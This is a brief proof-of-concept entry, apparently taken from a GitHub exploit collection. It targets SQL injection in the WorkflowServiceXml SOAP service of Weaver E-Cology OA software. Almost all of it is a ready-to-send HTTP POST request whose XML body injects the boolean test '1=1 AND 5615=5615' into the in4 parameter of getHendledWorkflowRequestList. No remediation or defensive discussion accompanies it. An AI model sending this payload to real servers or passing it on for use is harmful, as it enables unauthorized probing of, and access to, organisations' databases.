# ecology_WorkflowServiceXml_sqli

from: https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA-E-Cology%E6%8E%A5%E5%8F%A3WorkflowServiceXml%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

```
POST /services/WorkflowServiceXml HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: text/xml
Accept-Encoding: gzip
Content-Length: 487

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
  <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1 AND 5615=5615</web:string>
        </web:in4>
      </web:getHendledWorkflowRequestList>
  </soapenv:Body>
</soapenv:Envelope>
```
